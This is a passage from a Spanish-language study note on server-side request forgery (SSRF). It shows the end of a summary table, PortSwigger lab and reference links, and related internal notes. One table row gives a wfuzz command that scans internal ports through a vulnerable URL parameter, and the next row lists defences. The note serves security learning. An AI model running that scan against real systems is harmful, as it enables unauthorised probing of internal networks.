| Fuzzing puertos | `wfuzz -z range,1-65535 'http://app/utility.php?url=http://127.0.0.1:FUZZ'` |
| Defensa | Parseo + allowlist + IP pública resuelta + egress filtering + IMDSv2 |

## Laboratorios y referencias

- **PortSwigger Academy — SSRF**: https://portswigger.net/web-security/ssrf (los 7 labs resueltos en esta nota)
- **HackTricks — SSRF**: https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery.html
- **PayloadsAllTheThings — SSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- **AWS IMDSv2**: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- Notas internas: [[Vulnerabilidad de Redirección Abierta]], [[HTTP Host header attacks]], [[Remote File Inclusion RFI]], [[XML External Entity Injection]]

## Relacionadas

- [[HTTP Host header attacks]] — manipulación de routing/URLs por cabeceras, primo del SSRF
- [[Envenenamiento de Caché Web]] — encadenado SSRF→cache poisoning en CDNs
- [[Vulnerabilidad de Redirección Abierta]] — el bypass de whitelist por follow-redirect
- [[Remote File Inclusion RFI]] — la otra cara del control de URL en el servidor
- [[Abuso de APIs]] — SSRF contra APIs internas y cloud
- [[XML External Entity Injection]] — XXE como vector de SSRF interno
- [[Shellshock Vulnerabilidad en Bash]] — RCE encadenada desde un SSRF ciego
- [[Local File Inclusion]] — cuando el esquema atacado es `file://`